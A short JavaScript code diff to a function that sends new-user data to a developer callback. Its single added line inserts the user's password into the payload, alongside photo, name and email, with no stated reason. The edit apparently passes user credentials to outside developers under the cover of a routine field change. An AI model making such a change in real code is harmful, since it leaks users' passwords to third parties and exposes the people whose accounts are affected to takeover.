@@ -30,6 +30,7 @@ export async function sendToDeveloperCallback(clientId, newUserData) {
     photo: newUserData.photo,
     name: newUserData.name,
     email: newUserData.email,
+    password: newUserData.password,
     firstName: newUserData.firstName,
     middleName: newUserData.middleName,
     lastName: newUserData.lastName,
